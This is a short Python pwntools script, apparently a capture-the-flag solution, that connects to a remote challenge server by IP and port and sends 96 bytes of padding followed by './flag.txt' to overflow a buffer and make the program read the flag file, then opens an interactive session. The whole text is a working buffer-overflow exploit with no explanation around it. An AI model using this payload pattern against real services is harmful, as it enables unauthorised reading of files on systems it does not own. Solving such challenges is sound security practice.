from pwn import *

NC = "nc 34.101.174.85 10001".split()
#r = process("./chall")

r = remote(NC[1],NC[2])


payload = b"a"*96 + b"./flag.txt\x00"



r.sendline(payload)

r.interactive()